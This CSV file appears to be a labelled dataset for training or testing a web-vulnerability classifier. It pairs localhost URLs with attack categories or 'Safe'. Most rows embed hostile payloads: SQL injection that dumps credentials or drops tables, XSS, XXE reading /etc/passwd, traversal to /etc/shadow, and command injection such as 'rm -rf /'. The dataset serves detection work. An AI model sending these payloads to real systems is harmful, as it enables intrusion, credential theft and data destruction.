URL,Vulnerability Type
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/dashboard?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/product?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/order?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/download?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/search?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/login?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/admin?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/checkout?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/settings?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/search?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/invoice?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/dashboard?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/profile?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/admin?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/comments?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/profile?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/report?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/cart?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/cart?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/order?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/user?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/settings?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/comments?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/download?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/search?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/review?note=<body onload=alert('XSS')>,XSS
"http://127.0.0.1:5000/review?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/user?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/report?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/posts?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/admin?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/report?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/product?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/order?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/posts?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/messages?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/cart?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/file?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/checkout?load=config.php,File Inclusion
http://127.0.0.1:5000/report?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/search?command=| netstat -an,Command Injection
http://127.0.0.1:5000/upload?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/invoice?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/settings?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/messages?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/login?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/user?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/login?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?load=config.php,File Inclusion
http://127.0.0.1:5000/login?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/profile?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/product?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/login?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/invoice?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/order?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/invoice?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/search?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/download?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/file?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/file?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/order?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/messages?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/search?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/user?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/checkout?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/file?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/posts?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/invoice?run=`whoami`,Command Injection
http://127.0.0.1:5000/search?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/posts?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/search?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/review?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/comments?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/profile?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/download?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/comments?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/report?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/search?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/upload?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/posts?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/settings?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/settings?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/posts?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/profile?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/order?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/posts?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/search?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/login?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/invoice?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/product?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/invoice?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?run=`whoami`,Command Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/search?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/review?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/review?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/user?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/file?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/comments?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/upload?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/search?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/upload?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/login?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/invoice?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/user?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/order?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/user?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/product?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/invoice?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/report?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/posts?command=| netstat -an,Command Injection
http://127.0.0.1:5000/order?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/comments?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/checkout?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/file?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/download?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/profile?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/review?command=| netstat -an,Command Injection
http://127.0.0.1:5000/login?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/user?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/profile?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/dashboard?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/admin?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/invoice?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/profile?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/download?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/download?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/cart?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/review?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/user?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/order?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/order?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/order?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/review?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/download?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/search?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/dashboard?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/download?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/upload?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/profile?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/posts?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/login?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/order?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/product?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/search?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/report?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/order?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/report?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/dashboard?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/messages?password=' OR '1'='1' --,SQL Injection
"http://127.0.0.1:5000/posts?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/posts?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/cart?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/posts?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/dashboard?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/upload?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/download?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/order?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/messages?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/search?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/report?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/invoice?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/file?command=| netstat -an,Command Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/report?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/profile?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/login?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/cart?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/order?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/upload?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/settings?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/cart?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/review?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/order?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/login?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/admin?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/file?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/order?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/invoice?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/report?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/search?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?run=`whoami`,Command Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/posts?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/user?load=config.php,File Inclusion
http://127.0.0.1:5000/upload?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/upload?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/order?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/order?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/upload?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/upload?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/user?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/report?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/posts?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/review?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/settings?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/cart?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/order?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/search?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/download?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/settings?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/report?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/settings?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/file?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/file?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/search?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/product?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/settings?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/cart?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/user?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/download?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/order?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/admin?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/profile?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/invoice?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/report?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/report?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/profile?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/report?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/dashboard?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/cart?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/upload?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/posts?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/upload?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/search?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/order?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/posts?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/order?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/user?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/file?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/review?load=config.php,File Inclusion
http://127.0.0.1:5000/login?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/messages?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/download?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/file?load=config.php,File Inclusion
http://127.0.0.1:5000/settings?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/login?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/product?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/login?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/messages?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/checkout?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/admin?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/posts?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/posts?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/product?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/messages?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/report?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/checkout?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/upload?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/user?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/file?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/comments?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/upload?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/user?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/report?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/comments?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/dashboard?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/cart?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/checkout?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/product?user=admin'--,SQL Injection
http://127.0.0.1:5000/messages?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/product?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/product?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/static/styles1.css,Safe
